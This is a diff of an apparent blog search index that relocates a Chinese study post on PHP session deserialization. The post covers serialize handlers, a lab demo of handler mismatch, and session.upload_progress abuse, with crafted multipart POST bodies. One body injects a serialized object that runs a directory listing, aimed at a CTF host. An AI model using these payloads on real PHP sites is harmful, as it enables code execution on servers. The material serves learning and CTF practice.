@@ -797,6 +797,179 @@
       </categories>
   </entry>
   <entry>
+    <title>session反序列化学习</title>
+    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>好用，爱用，多用</p>
+<span id="more"></span>
+
+<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
+<p><strong>PHP session：</strong></p>
+<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
+<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
+<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
+<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
+<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
+<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>session.save_handler&#x3D;””</li>
+</ul>
+<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
+<ul>
+<li><strong>session.serialize_handler</strong></li>
+</ul>
+<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
+<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
+<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
+<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
+<p>并且文件的内容始终是session值的序列化之后的内容。</p>
+<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
+<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
+<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
+<ul>
+<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
+</li>
+<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
+</li>
+</ul>
+<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
+<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>处理器名称</th>
+<th>存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody></table>
+<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
+<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
+<p>测试一下，demo如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
+<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
+<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
+<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
+<p>demo改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
+<p>两张图片可以对比一下</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
+<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
+<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
+<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
+<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
+<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
+<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
+<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
+<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
+<p>flag.php：</p>
+<p>这个页面用于接受session的值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.php：</p>
+<p>这个页面用于测试反序</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先访问1.php，输出</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
+<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
+<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
+<p>在电脑上看一看此时session的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到成功写入，这是再访问以下1.php</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
+<p>成功反序。</p>
+<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
+<ul>
+<li>两个文件session引擎配置不同</li>
+<li>其中一个session可控</li>
+<li>两个文件同域</li>
+</ul>
+<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
+<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
+<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
+<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
+<p>条件：</p>
+<ol>
+<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
+<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
+</ol>
+<p>这两个都是可在查的</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
+<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
+<p><strong>对session上传进度说明一下：</strong></p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
+<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>
+
+<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
+<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>
+
+<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
+<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
+<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
+<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
+<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
+<p>开始解析：</p>
+<p>1. </p>
+<ul>
+<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
+<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
+</ul>
+<p>脚本等我后面再补上，有佬有的话求</p>
+<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
+<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
+]]></content>
+      <categories>
+        <category>php相关漏洞</category>
+        <category>php反序列化</category>
+        <category>session反序列化</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pickle反序列化</title>
     <url>/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>本篇文章用于简单入门，pickle反序列化危害性大，可以直接RCE</p>
@@ -1288,179 +1461,6 @@
       <categories>
         <category>Python漏洞</category>
         <category>pickle反序列化</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>session反序列化学习</title>
-    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>好用，爱用，多用</p>
-<span id="more"></span>
-
-<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
-<p><strong>PHP session：</strong></p>
-<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
-<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
-<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
-<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
-<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
-<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>session.save_handler&#x3D;””</li>
-</ul>
-<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
-<ul>
-<li><strong>session.serialize_handler</strong></li>
-</ul>
-<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
